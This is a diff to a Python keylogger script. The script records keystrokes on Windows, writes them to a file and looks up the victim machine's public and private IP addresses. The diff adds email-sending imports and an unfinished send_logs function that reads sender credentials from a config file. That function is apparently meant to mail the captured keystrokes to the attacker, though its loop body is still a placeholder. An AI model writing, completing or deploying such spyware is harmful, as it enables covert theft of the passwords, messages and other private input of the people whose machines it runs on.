@@ -9,6 +9,11 @@ import random
 import requests
 import socket
 import win32gui
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 
 publicIP = requests.get('https://api.ipify.org').text
 privateIP = socket.gethostbyname(socket.gethostname())
@@ -68,6 +73,20 @@ def write_file(count):
     with open(file, 'w') as fp:
         fp.write(''.join(logged_data))
 
+    def send_logs():
+        count = 0 
+
+        fromAddr = config.fromAddr
+        fromPswd = config.fromPswd
+        toAddr = fromAddr
+
+        MIN = 10
+        SECONDS = 60
+
+        time.sleep(10)
+        while True:
+            if len(logged_data) > 1:
+                pass
 
 """temporary function to stop listening when esc is pressed"""
 def on_release(key):
